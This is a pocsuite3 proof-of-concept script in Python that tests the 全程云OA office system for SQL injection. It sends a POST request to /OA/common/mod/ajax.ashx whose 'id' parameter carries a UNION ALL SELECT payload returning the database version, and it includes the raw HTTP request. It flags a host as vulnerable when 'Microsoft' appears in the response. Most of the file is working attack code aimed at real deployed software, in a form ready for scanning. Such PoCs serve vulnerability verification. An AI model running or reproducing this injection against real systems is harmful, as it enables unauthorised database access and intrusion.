# _*_ coding:utf-8 _*_
# @Time : 2024/1/7 19:27
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class tosec_maincig(POCBase):
    pocDesc = '''全程云OA SQL注入漏洞'''
    vulID = '1'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2024-01-07'
    createDate = '2024-01-07'
    updateDate = '2024-01-07'
    name = '全程云OA SQL注入漏洞'
    appName = '全程云OA'

    def _verify(self):

        result = {}
        path = """/OA/common/mod/ajax.ashx"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        url = self.url + path
        data  = {
    'dll': 'DispartSell_Core.dll',
    'class': 'DispartSell_Core.BaseData.DrpDataManager',
    'method': 'GetProductById',
    'id': '1 UNION ALL SELECT 1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 -- A'
}


        payload = """
        POST /OA/common/mod/ajax.ashx HTTP/1.1
        Host:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        DNT: 1
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 206
        
        dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT 1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 -- A
        """
        try:
            response = requests.post(url, headers=headers,data=data)
            if response.status_code == 200 and 'Microsoft' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload


            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(tosec_maincig)